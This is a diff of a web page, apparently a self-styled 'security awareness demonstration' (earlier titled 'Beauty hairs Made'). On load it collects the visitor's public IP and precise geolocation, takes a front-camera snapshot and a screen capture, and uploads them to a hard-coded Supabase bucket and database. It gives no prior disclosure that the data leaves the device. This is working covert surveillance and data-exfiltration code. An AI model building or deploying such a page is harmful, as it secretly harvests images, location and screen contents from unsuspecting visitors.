@@ -1,199 +1,1046 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <meta charset="UTF-8">
+
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Beauty hairs Made</title>
+
+<title>Security Awareness Demonstration</title>
+
+
 <style>
-*{box-sizing:border-box}
-body{margin:0;min-height:100vh;background:#050505;color:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px}
-.container{width:100%;max-width:720px;text-align:center}
-.card{background:#101010;border:1px solid #292929;border-radius:16px;padding:40px}
-h1{margin:0 0 12px;font-size:32px}
-p{color:#999;line-height:1.6}
-.spinner{width:44px;height:44px;border:4px solid #333;border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin:28px auto}
-@keyframes spin{to{transform:rotate(360deg)}}
-.status{font-size:18px;margin-top:20px}
-.results{display:none;text-align:left;margin-top:28px}
-.row{background:#181818;border-radius:10px;padding:14px;margin:10px 0}
-.label{display:block;color:#777;font-size:12px;margin-bottom:5px}
-.value{word-break:break-word}
-.notice{font-size:13px;color:#777;margin-top:24px}
-.success{font-size:22px;font-weight:bold}
+
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+
+    margin: 0;
+
+    width: 100%;
+
+    height: 100%;
+
+    font-family: Arial, sans-serif;
+
+    background: #080808;
+
+    color: white;
+}
+
+
+body {
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+}
+
+
+.loading {
+
+    text-align: center;
+
+    width: 90%;
+
+    max-width: 450px;
+}
+
+
+.spinner {
+
+    width: 55px;
+
+    height: 55px;
+
+    margin: 0 auto 25px;
+
+    border: 4px solid #333;
+
+    border-top: 4px solid white;
+
+    border-radius: 50%;
+
+    animation: spin 1s linear infinite;
+}
+
+
+@keyframes spin {
+
+    100% {
+
+        transform: rotate(360deg);
+
+    }
+
+}
+
+
+h1 {
+
+    font-size: 22px;
+
+    margin-bottom: 10px;
+
+}
+
+
+#status {
+
+    color: #999;
+
+    font-size: 14px;
+
+}
+
+
+.complete {
+
+    display: none;
+}
+
+
+.complete h1 {
+
+    color: #51cf66;
+
+}
+
+
+.results {
+
+    margin-top: 20px;
+
+    text-align: left;
+
+    background: #111;
+
+    border: 1px solid #292929;
+
+    border-radius: 10px;
+
+    padding: 15px;
+
+    font-size: 13px;
+
+    white-space: pre-wrap;
+
+    word-break: break-word;
+}
+
+
+video,
+canvas {
+
+    display: none;
+}
+
 </style>
+
 </head>
+
+
 <body>
-<div class="container">
-  <div class="card">
-    <h1>Beauty hairs Made</h1>
-    <p>This demonstration shows what information a website can request through normal browser permission prompts. Camera, screen-sharing, and location access require your explicit browser permission.</p>
-    <div id="spinner" class="spinner"></div>
-    <div id="status" class="status">Loading</div>
-    <div id="results" class="results">
-      <div class="success">✓ Demonstration Complete</div>
-      <div class="row"><span class="label">Public IP</span><span id="ip" class="value">Unavailable</span></div>
-      <div class="row"><span class="label">Location</span><span id="location" class="value">Unavailable</span></div>
-      <div class="row"><span class="label">Camera</span><span id="camera" class="value">Not granted</span></div>
-      <div class="row"><span class="label">Screen</span><span id="screen" class="value">Not granted</span></div>
-    </div>
-    <div class="notice">No browser permission is bypassed. You can deny any request.</div>
-  </div>
+
+
+<div class="loading" id="loadingScreen">
+
+    <div class="spinner"></div>
+
+    <h1>Initializing Security Demonstration</h1>
+
+    <p id="status">
+        Please wait...
+    </p>
+
 </div>
 
+
+
+<div class="loading complete" id="completeScreen">
+
+    <h1>✓ Demonstration Complete</h1>
+
+    <p>
+        The requested browser permissions were processed.
+    </p>
+
+    <div class="results" id="results"></div>
+
+</div>
+
+
+
+<!-- Hidden media elements -->
+
+<video id="camera" autoplay playsinline></video>
+
+<canvas id="photoCanvas"></canvas>
+
+
+
+<!-- Supabase JavaScript Library -->
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+
+
 <script>
-const SUPABASE_URL="https://vedhrxrtkbqpxozjpedj.supabase.co";
-const SUPABASE_KEY="sb_publishable_827rH0uPm4NFHNodhZr0bA_OzpAccwb";
-const supabaseClient=supabase.createClient(SUPABASE_URL,SUPABASE_KEY);
 
-const statusEl=document.getElementById("status");
-const spinner=document.getElementById("spinner");
-const results=document.getElementById("results");
+/* ==============================
+   SUPABASE CONFIGURATION
+   ============================== */
 
-let publicIp=null;
-let latitude=null;
-let longitude=null;
-let locationAccuracy=null;
-let cameraGranted=false;
-let screenGranted=false;
-let cameraScreenshotPath=null;
-let screenScreenshotPath=null;
+const SUPABASE_URL =
+    "https://vedhrxrtkbqpxozjpedj.supabase.co";
 
-function setStatus(message){statusEl.textContent=message;}
+const SUPABASE_ANON_KEY =
+    "sb_publishable_827rH0uPm4NFHNodhZr0bA_OzpAccwb";
 
-async function getPublicIp(){
-  try{
-    const response=await fetch("https://api.ipify.org?format=json");
-    if(!response.ok) throw new Error("IP request failed");
-    const data=await response.json();
-    publicIp=data.ip||null;
-  }catch(error){
-    console.warn("IP unavailable:",error);
-  }
-}
-
-function getLocation(){
-  return new Promise(resolve=>{
-    if(!navigator.geolocation){resolve();return;}
-    navigator.geolocation.getCurrentPosition(
-      position=>{
-        latitude=position.coords.latitude;
-        longitude=position.coords.longitude;
-        locationAccuracy=position.coords.accuracy;
-        resolve();
-      },
-      ()=>resolve(),
-      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+const supabaseClient =
+    supabase.createClient(
+        SUPABASE_URL,
+        SUPABASE_ANON_KEY
     );
-  });
+
+
+/* ==============================
+   ELEMENTS
+   ============================== */
+
+const statusElement =
+    document.getElementById("status");
+
+const loadingScreen =
+    document.getElementById("loadingScreen");
+
+const completeScreen =
+    document.getElementById("completeScreen");
+
+const resultsElement =
+    document.getElementById("results");
+
+const camera =
+    document.getElementById("camera");
+
+const canvas =
+    document.getElementById("photoCanvas");
+
+
+/* ==============================
+   HELPER
+   ============================== */
+
+function updateStatus(message) {
+
+    statusElement.textContent = message;
+
 }
 
-async function uploadBlob(blob,folder,prefix){
-  const path=folder+"/"+prefix+"_"+Date.now()+"_"+crypto.randomUUID()+".jpg";
-  const {error}=await supabaseClient.storage
-    .from("awareness-screenshots")
-    .upload(path,blob,{contentType:"image/jpeg",upsert:false});
-  if(error) throw error;
-  return path;
-}
 
-async function captureCamera(){
-  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-  try{
-    setStatus("Requesting camera permission...");
-    const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-    cameraGranted=true;
-    const video=document.createElement("video");
-    video.srcObject=stream;
-    video.muted=true;
-    await video.play();
-    await new Promise(resolve=>setTimeout(resolve,500));
-    if(video.videoWidth && video.videoHeight){
-      const canvas=document.createElement("canvas");
-      canvas.width=video.videoWidth;
-      canvas.height=video.videoHeight;
-      canvas.getContext("2d").drawImage(video,0,0);
-      const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.85));
-      if(blob) cameraScreenshotPath=await uploadBlob(blob,"camera","camera");
+function generateId() {
+
+    if (
+        window.crypto &&
+        typeof window.crypto.randomUUID === "function"
+    ) {
+
+        return window.crypto.randomUUID();
+
     }
-    stream.getTracks().forEach(track=>track.stop());
-  }catch(error){
-    console.warn("Camera unavailable or denied:",error);
-  }
+
+    return (
+        Date.now() +
+        "_" +
+        Math.random()
+            .toString(36)
+            .substring(2)
+    );
+
 }
 
-async function captureScreen(){
-  if(!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
-  try{
-    setStatus("Requesting screen-sharing permission...");
-    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
-    screenGranted=true;
-    const video=document.createElement("video");
-    video.srcObject=stream;
-    video.muted=true;
-    await video.play();
-    await new Promise(resolve=>setTimeout(resolve,500));
-    if(video.videoWidth && video.videoHeight){
-      const canvas=document.createElement("canvas");
-      canvas.width=video.videoWidth;
-      canvas.height=video.videoHeight;
-      canvas.getContext("2d").drawImage(video,0,0);
-      const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.85));
-      if(blob) screenScreenshotPath=await uploadBlob(blob,"screen","screen");
+
+/* ==============================
+   GET PUBLIC IP
+   ============================== */
+
+async function getPublicIP() {
+
+    try {
+
+        const response =
+            await fetch(
+                "https://api.ipify.org?format=json"
+            );
+
+        const data =
+            await response.json();
+
+        return data.ip || null;
+
+    } catch (error) {
+
+        console.error(
+            "IP error:",
+            error
+        );
+
+        return null;
+
     }
-    stream.getTracks().forEach(track=>track.stop());
-  }catch(error){
-    console.warn("Screen capture unavailable or denied:",error);
-  }
+
 }
 
-async function saveRecord(){
-  const {error}=await supabaseClient.from("awareness_demo").insert({
-    public_ip:publicIp,
-    latitude:latitude,
-    longitude:longitude,
-    location_accuracy:locationAccuracy,
-    camera_granted:cameraGranted,
-    screen_granted:screenGranted,
-    camera_screenshot_path:cameraScreenshotPath,
-    screen_screenshot_path:screenScreenshotPath
-  });
-  if(error) throw error;
+
+/* ==============================
+   GET LOCATION
+   ============================== */
+
+function getLocation() {
+
+    return new Promise((resolve) => {
+
+        if (!navigator.geolocation) {
+
+            resolve(null);
+
+            return;
+
+        }
+
+
+        navigator.geolocation.getCurrentPosition(
+
+            position => {
+
+                resolve({
+
+                    latitude:
+                        position.coords.latitude,
+
+                    longitude:
+                        position.coords.longitude,
+
+                    accuracy:
+                        position.coords.accuracy
+
+                });
+
+            },
+
+            error => {
+
+                console.log(
+                    "Location permission denied or unavailable."
+                );
+
+                resolve(null);
+
+            },
+
+            {
+                enableHighAccuracy: true,
+
+                timeout: 10000,
+
+                maximumAge: 0
+
+            }
+
+        );
+
+    });
+
 }
 
-function showResults(){
-  document.getElementById("ip").textContent=publicIp||"Unavailable";
-  document.getElementById("location").textContent=
-    latitude!==null && longitude!==null
-      ? latitude.toFixed(6)+", "+longitude.toFixed(6)
-      : "Unavailable";
-  document.getElementById("camera").textContent=cameraGranted?"Granted":"Not granted";
-  document.getElementById("screen").textContent=screenGranted?"Granted":"Not granted";
-  spinner.style.display="none";
-  results.style.display="block";
+
+/* ==============================
+   CAMERA
+   ============================== */
+
+async function captureCamera() {
+
+    try {
+
+        updateStatus(
+            "Checking camera permission..."
+        );
+
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+
+            return {
+
+                granted: false,
+
+                path: null
+
+            };
+
+        }
+
+
+        const devices =
+            await navigator.mediaDevices.enumerateDevices();
+
+
+        const hasCamera =
+            devices.some(
+                device =>
+                    device.kind === "videoinput"
+            );
+
+
+        if (!hasCamera) {
+
+            console.log(
+                "No camera detected."
+            );
+
+            return {
+
+                granted: false,
+
+                path: null
+
+            };
+
+        }
+
+
+        updateStatus(
+            "Requesting camera permission..."
+        );
+
+
+        const stream =
+            await navigator.mediaDevices.getUserMedia({
+
+                video: {
+                    facingMode: "user"
+                },
+
+                audio: false
+
+            });
+
+
+        camera.srcObject = stream;
+
+
+        await new Promise(resolve => {
+
+            camera.onloadedmetadata =
+                resolve;
+
+        });
+
+
+        await new Promise(resolve =>
+            setTimeout(resolve, 500)
+        );
+
+
+        canvas.width =
+            camera.videoWidth;
+
+        canvas.height =
+            camera.videoHeight;
+
+
+        const context =
+            canvas.getContext("2d");
+
+
+        context.drawImage(
+            camera,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+        );
+
+
+        const blob =
+            await new Promise(resolve => {
+
+                canvas.toBlob(
+
+                    resolve,
+
+                    "image/jpeg",
+
+                    0.85
+
+                );
+
+            });
+
+
+        stream
+            .getTracks()
+            .forEach(track =>
+                track.stop()
+            );
+
+
+        if (!blob) {
+
+            return {
+
+                granted: true,
+
+                path: null
+
+            };
+
+        }
+
+
+        updateStatus(
+            "Uploading camera screenshot..."
+        );
+
+
+        const filename =
+            `camera/camera_${Date.now()}_${generateId()}.jpg`;
+
+
+        const upload =
+            await supabaseClient
+                .storage
+                .from("awareness-screenshots")
+                .upload(
+                    filename,
+                    blob,
+                    {
+                        contentType:
+                            "image/jpeg",
+
+                        upsert: false
+                    }
+                );
+
+
+        if (upload.error) {
+
+            console.error(
+                "Camera upload error:",
+                upload.error
+            );
+
+            return {
+
+                granted: true,
+
+                path: null
+
+            };
+
+        }
+
+
+        return {
+
+            granted: true,
+
+            path: upload.data.path
+
+        };
+
+
+    } catch (error) {
+
+        console.log(
+            "Camera permission was not granted."
+        );
+
+        return {
+
+            granted: false,
+
+            path: null
+
+        };
+
+    }
+
 }
 
-async function runDemo(){
-  try{
-    await getPublicIp();
-    setStatus("Requesting location permission...");
-    await getLocation();
-    await captureCamera();
-    await captureScreen();
-    setStatus("Saving demonstration result...");
-    await saveRecord();
-    setStatus("Demonstration Complete");
-    showResults();
-  }catch(error){
-    console.error(error);
-    spinner.style.display="none";
-    setStatus("The demonstration could not be completed.");
-    results.style.display="block";
-    document.getElementById("location").textContent="Error: "+error.message;
-  }
+
+/* ==============================
+   SCREEN CAPTURE
+   ============================== */
+
+async function captureScreen() {
+
+    try {
+
+        updateStatus(
+            "Requesting screen-sharing permission..."
+        );
+
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getDisplayMedia
+        ) {
+
+            return {
+
+                granted: false,
+
+                path: null
+
+            };
+
+        }
+
+
+        const stream =
+            await navigator.mediaDevices.getDisplayMedia({
+
+                video: true,
+
+                audio: false
+
+            });
+
+
+        const screenVideo =
+            document.createElement("video");
+
+
+        screenVideo.srcObject =
+            stream;
+
+        screenVideo.autoplay =
+            true;
+
+        screenVideo.playsInline =
+            true;
+
+
+        await new Promise(resolve => {
+
+            screenVideo.onloadedmetadata =
+                resolve;
+
+        });
+
+
+        await new Promise(resolve =>
+            setTimeout(resolve, 500)
+        );
+
+
+        canvas.width =
+            screenVideo.videoWidth;
+
+        canvas.height =
+            screenVideo.videoHeight;
+
+
+        const context =
+            canvas.getContext("2d");
+
+
+        context.drawImage(
+
+            screenVideo,
+
+            0,
+
+            0,
+
+            canvas.width,
+
+            canvas.height
+
+        );
+
+
+        const blob =
+            await new Promise(resolve => {
+
+                canvas.toBlob(
+
+                    resolve,
+
+                    "image/jpeg",
+
+                    0.85
+
+                );
+
+            });
+
+
+        stream
+            .getTracks()
+            .forEach(track =>
+                track.stop()
+            );
+
+
+        if (!blob) {
+
+            return {
+
+                granted: true,
+
+                path: null
+
+            };
+
+        }
+
+
+        updateStatus(
+            "Uploading screen screenshot..."
+        );
+
+
+        const filename =
+            `screen/screen_${Date.now()}_${generateId()}.jpg`;
+
+
+        const upload =
+            await supabaseClient
+                .storage
+                .from("awareness-screenshots")
+                .upload(
+                    filename,
+                    blob,
+                    {
+                        contentType:
+                            "image/jpeg",
+
+                        upsert: false
+                    }
+                );
+
+
+        if (upload.error) {
+
+            console.error(
+                "Screen upload error:",
+                upload.error
+            );
+
+            return {
+
+                granted: true,
+
+                path: null
+
+            };
+
+        }
+
+
+        return {
+
+            granted: true,
+
+            path: upload.data.path
+
+        };
+
+
+    } catch (error) {
+
+        console.log(
+            "Screen permission was not granted."
+        );
+
+        return {
+
+            granted: false,
+
+            path: null
+
+        };
+
+    }
+
 }
 
-runDemo();
+
+/* ==============================
+   SAVE RESULT TO DATABASE
+   ============================== */
+
+async function saveResult(data) {
+
+    updateStatus(
+        "Saving demonstration results..."
+    );
+
+
+    const { error } =
+        await supabaseClient
+            .from("awareness_demo")
+            .insert({
+
+                public_ip:
+                    data.public_ip,
+
+                latitude:
+                    data.latitude,
+
+                longitude:
+                    data.longitude,
+
+                location_accuracy:
+                    data.location_accuracy,
+
+                camera_granted:
+                    data.camera_granted,
+
+                screen_granted:
+                    data.screen_granted,
+
+                camera_screenshot_path:
+                    data.camera_screenshot_path,
+
+                screen_screenshot_path:
+                    data.screen_screenshot_path
+
+            });
+
+
+    if (error) {
+
+        console.error(
+            "Database error:",
+            error
+        );
+
+        return false;
+
+    }
+
+
+    return true;
+
+}
+
+
+/* ==============================
+   MAIN DEMONSTRATION
+   ============================== */
+
+async function runDemonstration() {
+
+    let publicIP = null;
+
+    let location = null;
+
+    let cameraResult = {
+
+        granted: false,
+
+        path: null
+
+    };
+
+    let screenResult = {
+
+        granted: false,
+
+        path: null
+
+    };
+
+
+    /* IP */
+
+    updateStatus(
+        "Checking network information..."
+    );
+
+    publicIP =
+        await getPublicIP();
+
+
+    /* LOCATION */
+
+    updateStatus(
+        "Requesting location permission..."
+    );
+
+    location =
+        await getLocation();
+
+
+    /* CAMERA */
+
+    cameraResult =
+        await captureCamera();
+
+
+    /* SCREEN */
+
+    screenResult =
+        await captureScreen();
+
+
+    /* DATABASE */
+
+    const saved =
+        await saveResult({
+
+            public_ip:
+                publicIP,
+
+            latitude:
+                location
+                    ? location.latitude
+                    : null,
+
+            longitude:
+                location
+                    ? location.longitude
+                    : null,
+
+            location_accuracy:
+                location
+                    ? location.accuracy
+                    : null,
+
+            camera_granted:
+                cameraResult.granted,
+
+            screen_granted:
+                screenResult.granted,
+
+            camera_screenshot_path:
+                cameraResult.path,
+
+            screen_screenshot_path:
+                screenResult.path
+
+        });
+
+
+    /* ==============================
+       SHOW RESULTS
+       ============================== */
+
+    loadingScreen.style.display =
+        "none";
+
+    completeScreen.style.display =
+        "block";
+
+
+    let resultText = "";
+
+
+    resultText +=
+        "Public IP: " +
+        (publicIP || "Unavailable") +
+        "\n\n";
+
+
+    if (location) {
+
+        resultText +=
+            "Latitude: " +
+            location.latitude +
+            "\n";
+
+        resultText +=
+            "Longitude: " +
+            location.longitude +
+            "\n";
+
+        resultText +=
+            "Location Accuracy: " +
+            location.accuracy +
+            " meters\n\n";
+
+    } else {
+
+        resultText +=
+            "Location: Not available\n\n";
+
+    }
+
+
+    resultText +=
+        "Camera Permission: " +
+        (
+            cameraResult.granted
+                ? "Granted"
+                : "Not Granted"
+        ) +
+        "\n";
+
+
+    resultText +=
+        "Camera Screenshot: " +
+        (
+            cameraResult.path
+                ? "Uploaded"
+                : "Not Uploaded"
+        ) +
+        "\n\n";
+
+
+    resultText +=
+        "Screen Permission: " +
+        (
+            screenResult.granted
+                ? "Granted"
+                : "Not Granted"
+        ) +
+        "\n";
+
+
+    resultText +=
+        "Screen Screenshot: " +
+        (
+            screenResult.path
+                ? "Uploaded"
+                : "Not Uploaded"
+        ) +
+        "\n\n";
+
+
+    resultText +=
+        "Database Save: " +
+        (
+            saved
+                ? "Successful"
+                : "Failed"
+        );
+
+
+    resultsElement.textContent =
+        resultText;
+
+}
+
+
+/* ==============================
+   START
+   ============================== */
+
+runDemonstration();
+
 </script>
+
 </body>
+
 </html>
